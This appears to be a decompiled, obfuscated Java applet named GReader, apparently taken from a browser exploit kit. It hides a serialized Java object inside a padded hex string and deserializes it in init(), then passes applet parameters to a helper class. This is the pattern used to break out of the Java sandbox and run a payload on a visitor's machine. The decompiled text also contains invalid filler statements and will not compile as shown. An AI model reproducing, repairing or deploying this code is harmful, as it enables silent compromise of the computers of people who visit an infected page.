// 
// Decompiled by Procyon v0.5.30
// 

package quote;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.applet.Applet;

public class GReader extends Applet
{
    Boolean _4766fe8e62;
    String _2e6a3a040c;
    Boolean _cfd7134ee0;
    Boolean _a0c7922769;
    int _e8741fa704;
    int _aa977842ac;
    Boolean _4b1b48af6a;
    String _cc6374be68;
    Boolean _24e047c8c1;
    Boolean _a18ee196a6;
    Boolean _e2d4a5ba3f;
    public static String data;
    int _8256c76a0b;
    int _4fa1f66789;
    String _6ba554c031;
    String _41298ab7b8;
    String _9405755fa2;
    private static final String serializedObject;
    Boolean _16e3bf163a;
    int _4903f6f7f9;
    int _b938f9ff32;
    int _989d2df645;
    Boolean _b0932329c1;
    Boolean _a3cba7c791;
    String _5085b705b6;
    private static final long serialVersionUID = -3238297386635759160L;
    Boolean _64564a3b1e;
    String _05f3f2082f;
    String _570234634d;
    String _c833b31a0e;
    Boolean _0291871144;
    Boolean _8b219ea0cb;
    String _663e82daf9;
    Boolean _3d4363cf1e;
    String _22e6694544;
    Boolean _b4f3c86f64;
    
    public GReader() {
        this._4766fe8e62 = true;
        this._2e6a3a040c = "_2e6a3a040c";
        this._cfd7134ee0 = false;
        this._a0c7922769 = true;
        this._e8741fa704 = 49;
        this._aa977842ac = 4;
        this._4b1b48af6a = true;
        this._cc6374be68 = "_cc6374be68";
        this._24e047c8c1 = false;
        this._a18ee196a6 = true;
        this._e2d4a5ba3f = true;
        this._8256c76a0b = 8;
        this._4fa1f66789 = 226;
        this._6ba554c031 = "";
        this._41298ab7b8 = "_41298ab7b8";
        this._9405755fa2 = "";
        this._16e3bf163a = false;
        this._4903f6f7f9 = 40;
        this._b938f9ff32 = 17;
        this._989d2df645 = 14;
        this._b0932329c1 = false;
        this._a3cba7c791 = true;
        this._5085b705b6 = "";
        this._64564a3b1e = true;
        this._05f3f2082f = "_05f3f2082f";
        this._570234634d = "";
        this._c833b31a0e = "";
        this._0291871144 = false;
        this._8b219ea0cb = true;
        this._663e82daf9 = "";
        this._3d4363cf1e = true;
        this._22e6694544 = "_22e6694544";
        this._b4f3c86f64 = false;
    }
    
    @Override
    public void init() {
        true;
        false;
        false;
        try {
            true;
            false;
            true;
            true;
            true;
            final ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Gmerrews.StringToBytes(GReader.serializedObject));
            true;
            true;
            final ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            true;
            true;
            false;
            false;
            false;
            final Object object = objectInputStream.readObject();
            false;
            String parameter = this.getParameter("dataOO".replace("O", ""));
            true;
            final String parameter2 = this.getParameter("cZc".replace("Z", ""));
            true;
            false;
            false;
            false;
            true;
            false;
            false;
            false;
            final GMailer instance = GMailer.instance;
            false;
            false;
            if (object != null && instance != null) {
                true;
                if (parameter == null) {
                    false;
                    true;
                    parameter = "";
                    true;
                    false;
                    false;
                    false;
                    false;
                }
                false;
                false;
                true;
                GMailer.instance.__o(parameter, parameter2);
                false;
                false;
                true;
            }
            true;
            false;
        }
        catch (Exception ex) {
            true;
            false;
            false;
            false;
            false;
            false;
        }
        true;
        true;
        true;
        true;
    }
    
    static {
        GReader.data = null;
        serializedObject = "ArCrrrrrrrErDrr0rr00rrr5rrr7rrrrrr37rr2rrrr001Brrrr6Arrr6rrr176612rrrrErrr7rrr5746rrrr9rr6C2E4rrrr7rrr72rr6rrr5676F7rrr26rrr9616rrrrE4rrrr3616rrrrCr6r56rrrE64rrr6rrr17rr2rr8F3DDr7D6rrrrE5rrBrrr0rrD0rrrC1rrrrrrrr02rr00rrrr0r14rrArrrrr0rr010677r26567r6F72rr6r96rrrr1rrrrrrr6Err4rr3rrr757rr4rr6F7665rrr72rrrrr7872rr0012r6A61rrr766rrrr12E7rr5rr7rrrrrr4696Crrrr2E4rrrrr3rrrr616rrCrr656rrrrrrrrE6r4rr61r7rrrr2E6rErrrrA4rDrrr1rrrEC8rrrrDrC5Brrrr8Errrr030r00Brrrrrr5rrArrrrr0r00C6172rrrr654rr6rr69r6r56C6r473rr5365r7rrrrrr44rrrr9rrrrrr0rrrrr00rrrE6rr6rr697273rrrr74r4rr4rr6r1rrrr7rrrr9r4F6r657rrrr656rr56rrrrB5Arrrr00rrr09r6r973rrr54rr6r96rD6rrr5r5rrr36574rr5Ar00rrr076rrCrrrr6rrrr56Errrrrrr69rrr656E7rrr4rrrr490rrrr016rr6D696rrrrrErrrr696rrrDr616rrrCrr4rr461r7r97r34rrrrr9rrr6rrE46rrr697rr273745rrrr765rrrrrrr6rrrr56Brrr4rrrr9rrr0rr0rr096E6rrr5787rr4r5374r6rrrrrr1rrr6rrrrDrrrr70rrr4rrr9rrrr0rrr0rrrr157rrr36rr57269616Crrr566rr57rrrr2rrrr73696rrF6rE4F6rrrErrrr537rrrrrrr47r26rrr5rrrr616Drrr4rrrArrrr0r0047rrrr46rrrrr96rDrrr6rrrr55Brrr0rrrrrr00666696r56C6r4rrr73rrrr7rrrr4rrr00r025rrB4rrr95rrrB0005r69r73536rr5rrr74740rr0rrr025Br5A4C0r0r0rrrr47A6rrFrrrr6Errr6r5r74r0rrr01rrrr44rrrrC6rrrA6rrr1r7rrrrr6rrrrrr6rrrr12rrrrFr757rr4rrr69r6Crrrr2rrrrF54r6r9rrrr6rrD65r5rrrArrrr6F6Errrr6rrrr5rrrr3Brrrr78rrrr70r01rrr0rrr0rr00000101010r00rrrr0rrrr000r1rrrr000rrrr0rrr000rrrrrr2rrrr000rr0rr0rrrr0rrrr0r1rr00rrrr0001rrr2156rrr3ArrFrrrrC0rrrrE75720rr002r5rBr494rrrDBrA6rr0rrrr267rrrr6rrrErrrrABr2A50rr2rr0000rrrr78rrr7000r0rrr000rr11000r0rrr000rrr10rrrr0rrrr0rrr00rrr7rrDrrrrr9000r000rrrrr0rrrr4r00000rrr01500rrrr0000r0rrr4000rrr0rr001r200r0rrrrrrr0008A0rr0rrr00r0rrrrrr00200rrr00rrrr0rrr00rr30rr000000rrrr1rrr00rrr00rrrrrr0rrrr0rr04r00rrrr0000rrr10rrr00rrrrrrrr0000rrr1r10rrrrrr0rr00rrrrrr0r02rrrr2rrr00rrr00r0r2DrrErrrrrFE4rrrrrr88rrC00rrrr0rrrrr00000r00rrr7572rrrr00r02rr5rrrBrrrr5A578Frrrrrrr203r9rr1rrrrrrr4Brrrrr8r5DrrrErrrr20rrr20r0rr0rrr078rr70rrrrrrr0rrr0rr000rr01101rrrr0r1rr01r01rrr0r101rr010rr10rr1rr01rrr0rrr101rr0rr1r0r1r01010rr1r7372rrrr0018rrrr6Arrr61rrrr7661rr2Errrrr75rrrr7r46rrr9r6rrrrC2E536rrr9rrrrrr6rrDrrrr7r06C65rrr5rrrrr46r96D65rrr5rArrrr6rrF6E6rr5FrA6rrrrrrr75rD60rrrDrrrr15rrErrF5A60rrr30rr01rrrrrrr2rrrr4rrr900rrrr0A64rrrrrrrr73rr74rrr5rrrr36176696rrrrE6rrrr77rr349r0rrrr00rrrrr66rr56rrrrrrE644r46rr17rr949rrr0r00rrC656rrErrr644rrr4rrr6rrrr1r794rrrrrrFr6rrr65rrr76rrrr5r6rrrr5r6B4r9r000rrrr765rrrrr6rrrrE6rrr44D6rrrF64654rr90008r6r5rr6Er64rrrr4rrrrD6Frrrrr6rrrrE7r4rr68490rrrrrrrr0rrr0r7rrr656rrrrErrrrrrrr64rrrr54rrr696D6rrrr5490rrr00Brr6rrrr5rrr6rE64rrrr546rrrrrrr9rrrrrrr6D6rrrrrr5rrr4Drrr6F6465rrrr4rrrr900r0rrr9r7rrrr26r1rrr774rF6666736r5rrrr744rrr90r0r157rr36572696rr16Crrr56rrr65rrrr7273rr696F6E4rrrF6E5rrr3rrr7r472r6rrr5rrr6rrrrrrrr16D49r0008rr73rrr74rrrr617rr2744461rrr79r490rrr00E7r3rrrr74rrr617rr274446r17r94Frrrr6rr65r765r6rr5rrr6rrrBrr490rrr0rr09rr73746rrrr17r274rrrrrr4rrrDrrrr6F6rr465rrrrrrr4rrrrr9rrr000rrrArrr7r3rr7rr46rrrr1rrrr72r7rrrr4rr4D6Fr6rE74rrr6rr84rrrr900r0rr97rr3rrr7r461727rrrr4r5rrr46rrrrr96Drrrr6r5rrrr490rr0rrrr0D7rrrrr3rr74rrrrr6rrrrr172rrr745rrrr469rrrr6rrD6rrrrrr5rr4rrrDr6rrF646rrrr54rrrr9rr0rr0rrr0rr97rrrrrr3rrr7rrrr46r17rr274596561rrrr7rr25A00r0B7rrr573654rrrr46rrrr1rrr79rrr6C6967rrrr6rr874rr5Brr00rrr0B6rrrDrrrrr6rrF6Err7r4684rrrC656E67746r874rrrr00rrr025rrrBrrrrrrrr4rrr278rr7rrr2rrrrrr0rr012rrrr6Ar6rr1rrr7rrr6rr6rrrrrrr1rr2Errrr757rrr4r6rrr9rrrrr6Crrr2rrE54696rDrrr65rrrr5rrArr6rrF6rrE65rrrr31rrrrBrr3rrrrrrrErrrr9rrrrFrr5rrrr77rrrr4rrrr4ACrrrArrrr1rrrrrr0rrr2rr00014rrrCrr0rr0rrr0r2rrr4rrrr94r4rr740r01rrrrrrrr2rr4rrrrrrC6rrrArr6rrrr1rrrr7661r2rrrrrrrF6Cr61rrrr6E672Fr5r3rrr7rr4rrr726rrrr96E67rrrr3rrrBrrr7rrrr8r7rrrrrrr07rr4000E4rrrrr1rr6Drrrrrrr6rrrr5r7269rr6rr36rrrr12rF4461r7rrrr773rrrr6rrrrrF6rrrErrrr00rrr36EE8r00r0rr0rrrr0000rrr0rrrr0000000rrrrr00r0rrrr00rr0rrrrrr000rr00rrr0rrrr00r0000r000r0rrrr000rrrr0rrr000000r0FrrrE4rrrrrrr88Crrrr0rrrr0r0rrrrr00r00rrrr0rr0rrr20rrr0rrrrrr00rrrr0r0000rr0rr00rr00rrr00rr0rr00rr000rrrrr00rrr000rrr0r00000rrr0rrr0000r0rr0rrr0000rrrr0rr0rrr00rrrr000000r0000rrrr75r7r2rrr000rrr2rrrrrrr5B4rrr2ACrrF317Frrrr8060rr8rrr5r4E0rr0rr20rrrr00rr0rrr78rr70r0rrrr00r0rr00rrrr0C1F1C1rrrFr1E1rrrrrrrrF1rrrrrErrr1F1F1rrrrErrrr1Frrr1E1Frrrr770Ar0rrrrrr0rrr000rrrr006000rrr0rrr0000rrr00rr0rrr0757rrrr1007rrrrErr000rrr60rrrr0r0rrrr00rrrrrrrr00rrrr2rrr0rr0000rrrr000000rrrr0rrrr00rr00r7rrrr8rr737rrrr200r0Drrrr7175rr6F746rrrrrr52Errrrr47r4rrrrrDrrrr61rr6rrr96Cr6rr5rr725Er8rrrBr4rC6rrrrr7DrrrDrC40rr9rrD8rrr0r2r00rr0rrrr07rrr87rrr0rrr78FFFFF4E2rrrrF96rrr4AC000A".replace("r", "");
    }
}
